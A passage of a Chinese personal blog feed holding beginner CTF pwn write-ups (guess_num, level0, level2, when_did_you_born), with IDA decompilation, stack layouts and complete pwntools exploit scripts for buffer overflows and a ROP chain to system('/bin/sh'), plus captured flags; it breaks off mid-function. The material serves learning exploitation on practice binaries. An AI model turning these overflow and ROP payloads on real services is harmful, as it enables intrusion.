href="#我们点进去-gets函数的参数在栈中空间大小" class="headerlink" title="我们点进去 gets函数的参数在栈中空间大小"></a>我们点进去 gets函数的参数在栈中空间大小</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000040 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-0000000000000040 ; N       : rename</span><br><span class="line">-0000000000000040 ; U       : undefine</span><br><span class="line">-0000000000000040 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-0000000000000040 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0</span><br><span class="line">-0000000000000040 ;</span><br><span class="line">-0000000000000040</span><br><span class="line">-0000000000000040                 db ? ; undefined</span><br><span class="line">-000000000000003F                 db ? ; undefined</span><br><span class="line">-000000000000003E                 db ? ; undefined</span><br><span class="line">-000000000000003D                 db ? ; undefined</span><br><span class="line">-000000000000003C var_3C          dd ?</span><br><span class="line">-0000000000000038 var_38          dd ?</span><br><span class="line">-0000000000000034 var_34          dd ?</span><br><span class="line">-0000000000000030 var_30          db ?              //这里</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">-000000000000002D                 db ? ; undefined</span><br><span class="line">-000000000000002C                 db ? ; undefined</span><br><span class="line">-000000000000002B                 db ? ; undefined</span><br><span class="line">-000000000000002A                 db ? ; undefined</span><br><span class="line">-0000000000000029                 db ? ; undefined</span><br><span class="line">-0000000000000028                 db ? ; undefined</span><br><span class="line">-0000000000000027                 db ? ; undefined</span><br><span class="line">-0000000000000026                 db ? ; undefined</span><br><span class="line">-0000000000000025                 db ? ; undefined</span><br><span class="line">-0000000000000024                 db ? ; undefined</span><br><span class="line">-0000000000000023                 db ? ; undefined</span><br><span class="line">-0000000000000022                 db ? ; undefined</span><br><span class="line">-0000000000000021                 db ? ; undefined</span><br><span class="line">-0000000000000020                 db ? ; undefined</span><br><span class="line">-000000000000001F                 db ? ; undefined</span><br><span class="line">-000000000000001E                 db ? ; undefined</span><br><span class="line">-000000000000001D                 db ? ; undefined</span><br><span class="line">-000000000000001C                 db ? ; undefined</span><br><span class="line">-000000000000001B                 db ? ; undefined</span><br><span class="line">-000000000000001A                 db ? ; undefined</span><br><span class="line">-0000000000000019                 db ? ; undefined</span><br><span class="line">-0000000000000018                 db ? ; undefined</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined//到这里</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)   //发现紧跟着的就是 srand函数种子 seed  </span><br><span class="line">-0000000000000008 var_8           dq ?          //于是我们将它覆盖为 1</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><blockquote><p>我们发现v8在栈中是  0x20大小，构造payload:’a’*0x20+p64(1)</p></blockquote><h3 id="继续分析："><a href="#继续分析：" class="headerlink" title="继续分析："></a>继续分析：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; // rdi</span><br><span class="line">  int v5; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  int i; // [rsp+8h] [rbp-38h]</span><br><span class="line">  int v7; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  char v8; // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v10; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  v3 = stderr;</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0(v3, 0LL);</span><br><span class="line">  puts(&quot;-------------------------------&quot;);</span><br><span class="line">  puts(&quot;Welcome to a guess number game!&quot;);</span><br><span class="line">  puts(&quot;-------------------------------&quot;);</span><br><span class="line">  puts(&quot;Please let me know your name!&quot;);</span><br><span class="line">  printf(&quot;Your name:&quot;);                         // 交互    1</span><br><span class="line">  gets(&amp;v8);                                    //gets()是危险函数，漏洞点就在这里</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  for ( i = 0; i &lt;= 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % 6 + 1;</span><br><span class="line">    printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));</span><br><span class="line">    printf(&quot;Please input your guess number:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v5);                  // 交互     2  </span><br><span class="line">    puts(&quot;---------------------------------&quot;);</span><br><span class="line">    if ( v5 != v7 )                             // 即是 让我们输入的数 等与  随机生成的数  10次</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;GG!&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Success!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();                                    // system(&quot;cat flag&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里我们 循环10次， 我们将种子已经覆盖为了1   所以 10次循环后的V7 的值都想等相等，所以我们构造下面的exp： </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#值得一看的链接：https://www.jianshu.com/p/0bc6c65addfd</span><br><span class="line">#!usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">context.log_level=&apos;debug&apos;          </span><br><span class="line">#conn=process(&apos;./guess_num&apos;)</span><br><span class="line">conn=remote(&apos;111.198.29.45&apos;,&apos;55942&apos;)</span><br><span class="line">libc=cdll.LoadLibrary(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">payload=&quot;a&quot;*0x20+p64(1)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(&apos;Your name:&apos;)</span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):</span><br><span class="line">num=str(libc.rand()%6+1)</span><br><span class="line">conn.recvuntil(&apos;number:&apos;)</span><br><span class="line">conn.sendline(num)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line">#cyberpeace&#123;72e39663d5933ee27251b1a934c07778&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#   这里需要使用 C函数  使用python自带的ctype模块：</span><br><span class="line">    from ctypes import *</span><br><span class="line">    来实现python和c的混合编程</span><br><span class="line">    </span><br><span class="line">#设置日志等级为&apos;debug&apos;,屏幕上打印所有所有发送和收到的数据</span><br></pre></td></tr></table></figure><h3 id="libc共享库"><a href="#libc共享库" class="headerlink" title="libc共享库"></a>libc共享库</h3><ul><li>可以使用ldd查找：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd guess_num</span><br></pre></td></tr></table></figure><ul><li>也可以在脚本里查找：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&apos;./guess_num&apos;)</span><br><span class="line">libc = elf.libc</span><br></pre></td></tr></table></figure><blockquote><p>拓展些C与python混合编程：<a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a></p></blockquote><h1 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h1><p>表示有点难，主要是 自己的知识面太少导致的！还是 掌握知识速度太慢了！不过做出来一题，学习到一些东西，还是很会让人开心的，不过太慢了，。。。。。<br><img src="https://s2.ax1x.com/2019/09/27/uuZ839.png" alt="uuZ839.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;真难！&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn02</title>
    <link href="http://yoursite.com/2019/10/06/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn02/"/>
    <id>http://yoursite.com/2019/10/06/国庆七天之pwn02/</id>
    <published>2019-10-06T12:40:20.000Z</published>
    <updated>2019-10-07T15:46:26.708Z</updated>
    
    <content type="html"><![CDATA[<p>只能做做新手题…</p><a id="more"></a><h1 id="Level0"><a href="#Level0" class="headerlink" title="Level0"></a>Level0</h1><h2 id="检查文件属性及保护："><a href="#检查文件属性及保护：" class="headerlink" title="检查文件属性及保护："></a>检查文件属性及保护：</h2><blockquote><p>64位elf程序，并且开启了NX保护！于是栈和bss段就只有读写权限，没有执行权限</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ checksec level0</span><br><span class="line">[*] &apos;/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/level0&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><h2 id="拖入ida分析："><a href="#拖入ida分析：" class="headerlink" title="拖入ida分析："></a>拖入ida分析：</h2><blockquote><p>代码很短，一个写入函数写入0xD个字符到hell0，world的首部！，然后返回并执行了另一个vulnerable_function()函数!</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  write(1, &quot;Hello, World\n&quot;, 0xDuLL);</span><br><span class="line">  return vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>vulnerable_function()我们跟进去：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以看到它从*buf[0]rsp+0处开始向后最大可读取200个字符，而这个buf数组只有0x80的大小，再高8个地址是的调用函数之前的ebp地址，再高8个地址是call 指令的下一条指令，也是返回地址！<br>所以，这题应该就是用system(“/bin/sh”)所在地址覆盖掉返回地址，也就是取得shell权限，然后ls，再cat flag！<br>于是我们找下system(“/bin/sh”)所在地址：0000000000400596</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596 ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000400596</span><br><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596 ; __unwind &#123;</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040059F                 call    _system</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 ; &#125; // starts at 400596</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br><span class="line">.text:00000000004005A5</span><br></pre></td></tr></table></figure><h2 id="栈的结构："><a href="#栈的结构：" class="headerlink" title="栈的结构："></a>栈的结构：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">被调用函数压入的变量，这里就是 buf</span><br><span class="line">老ebp</span><br><span class="line">返回地址</span><br><span class="line">调用函数压入的变量</span><br></pre></td></tr></table></figure><h2 id="构造payload："><a href="#构造payload：" class="headerlink" title="构造payload："></a>构造payload：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#conn=process(&apos;./level0&apos;)</span><br><span class="line">conn=remote(&apos;111.198.29.45&apos;,&apos;51014&apos;)</span><br><span class="line">call_system=0x0000000000400596</span><br><span class="line"></span><br><span class="line">payload=0x88*&apos;a&apos;+p64(call_system)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line">#cyberpeace&#123;dbba6a81a0525dd630d5178dd078059f&#125;</span><br></pre></td></tr></table></figure><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><h2 id="运行下："><a href="#运行下：" class="headerlink" title="运行下："></a>运行下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ ./level2</span><br><span class="line">Input:</span><br><span class="line">yangmutou!</span><br><span class="line">Hello World!</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><h2 id="检查文件属性及保护：-1"><a href="#检查文件属性及保护：-1" class="headerlink" title="检查文件属性及保护："></a>检查文件属性及保护：</h2><blockquote><p>32位elf程序，NX enabled保护</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ checksec level2</span><br><span class="line">[*] &apos;/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/level2&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><h2 id="拖入ida（32）分析："><a href="#拖入ida（32）分析：" class="headerlink" title="拖入ida（32）分析："></a>拖入ida（32）分析：</h2><blockquote><p>主函数：首先调用了   vulnerable_function()函数，然后调用了system</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(&quot;echo &apos;Hello World!&apos;&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>vulnerable_function()函数跟进去：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  system(&quot;echo Input:&quot;);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><blockquote><p>这里题目提示   用rop技术做这题，所以我们就要构造个伪栈帧，来执行system(“/bin/sh”)函数;下图，更助于理解！<br><img src="https://s2.ax1x.com/2019/10/07/uWucCT.png" alt="uWucCT.png"></p></blockquote><h2 id="构造payload：-1"><a href="#构造payload：-1" class="headerlink" title="构造payload："></a>构造payload：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#conn=process(&apos;./level2&apos;)</span><br><span class="line">conn=remote(&apos;111.198.29.45&apos;,&apos;48927&apos;)</span><br><span class="line"></span><br><span class="line">system_addr=0x08048320</span><br><span class="line">sh_addr=0x0804A024</span><br><span class="line"></span><br><span class="line">payload=(0x88+0x4)*&apos;a&apos;+p32(system_addr)+p32(0x0)+p32(sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.recvuntil(&apos;Input:\n&apos;)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()#cyberpeace&#123;4e2601736e82eda491bae13188a33252&#125;</span><br></pre></td></tr></table></figure><h2 id="上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；"><a href="#上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；" class="headerlink" title="上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；"></a>上面这是我在做前几题的用仅有的经验写出的脚本，而我在wp中看到了这样脚本；</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&apos;i386&apos;,os=&apos;linux&apos;,log_level=&apos;debug&apos;)</span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;,9878)</span><br><span class="line"># sh = process(&quot;./level2&quot;)</span><br><span class="line">elf = ELF(&apos;./level2&apos;) </span><br><span class="line">_sys_addr = elf.symbols[&apos;system&apos;]</span><br><span class="line">sh_addr = elf.search(&apos;/bin/sh&apos;).next()</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos; * (0x88 + 0x4) + p32(_sys_addr) + p32(0x0) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Input:\n&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br><span class="line"></span><br><span class="line">作者：ch3ckr</span><br><span class="line">链接：https://www.jianshu.com/p/92d3cf7aa126</span><br><span class="line">來源：简书</span><br><span class="line">简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</span><br></pre></td></tr></table></figure><blockquote><p>原来这里的elf.symbols[‘system’]是  pwntools的elf模块中的symbols函数用来定位实际函数位置！了解到了，接下来我要接触下这个！</p></blockquote><p><br><br><br><br><br><br><br><img src="https://s2.ax1x.com/2019/09/27/uuZQNF.png" alt="uuZQNF.png"><br>终要加冕！//其实没有看过这个动画或者它的背景，看图生意！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;只能做做新手题…&lt;/p&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>疯狂的木头06</title>
    <link href="http://yoursite.com/2019/10/03/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B406/"/>
    <id>http://yoursite.com/2019/10/03/疯狂的木头06/</id>
    <published>2019-10-03T13:10:11.000Z</published>
    <updated>2019-10-07T15:46:44.950Z</updated>
    
    <content type="html"><![CDATA[<p>出来放松下这两天，和重要的人一起。</p><a id="more"></a><h1 id="今日无记录！"><a href="#今日无记录！" class="headerlink" title="今日无记录！"></a>今日无记录！</h1><p><img src="https://s2.ax1x.com/2019/09/19/nOsgw4.jpg" alt="nOsgw4.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;出来放松下这两天，和重要的人一起。&lt;/p&gt;
    
    </summary>
    
    
      <category term="疯狂的木头" scheme="http://yoursite.com/tags/%E7%96%AF%E7%8B%82%E7%9A%84%E6%9C%A8%E5%A4%B4/"/>
    
  </entry>
  
  <entry>
    <title>国庆七天之pwn01</title>
    <link href="http://yoursite.com/2019/10/02/%E5%9B%BD%E5%BA%86%E4%B8%83%E5%A4%A9%E4%B9%8Bpwn01/"/>
    <id>http://yoursite.com/2019/10/02/国庆七天之pwn01/</id>
    <published>2019-10-02T04:45:33.000Z</published>
    <updated>2019-10-02T05:00:49.287Z</updated>
    
    <content type="html"><![CDATA[<p>我好想有点入门了，哈哈！接下来就是在虚拟机中安装或者使用vim与sublime了，接下来要做的事情！</p><a id="more"></a><h1 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h1><blockquote><p>首先检查文件属性以及保护</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mutou@mutou-vm:~/下载$ checksec when_did_you_born</span><br><span class="line">[*] &apos;/home/mutou/\xe4\xb8\x8b\xe8\xbd\xbd/when_did_you_born&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">mutou@mutou-vm:~/下载$ </span><br><span class="line">mutou@mutou-vm:~/下载$ </span><br><span class="line">mutou@mutou-vm:~/下载$ </span><br><span class="line">mutou@mutou-vm:~/下载$ file when_did_you_born</span><br><span class="line">when_did_you_born: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br><span class="line">mutou@mutou-vm:~/下载$</span><br></pre></td></tr></table></figure><blockquote><p>我们拖入  ida查找下  漏洞：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  char v4; // [rsp+0h] [rbp-20h]</span><br><span class="line">  unsigned int v5; // [rsp+8h] [rbp-18h]//这里注意下</span><br><span class="line">  unsigned __int64 v6; // [rsp+18h] [rbp-8h]//还有这里，双击进去查看栈结构</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  puts(&quot;What&apos;s Your Birth?&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v5);                    // 输入   v5</span><br><span class="line">  while ( getchar() != 10 )                     // 输入  不能等于    10</span><br><span class="line">    ;</span><br><span class="line">  if ( v5 == 1926 )                             // 输入 1926的话直接退出程序</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You Cannot Born In 1926!&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  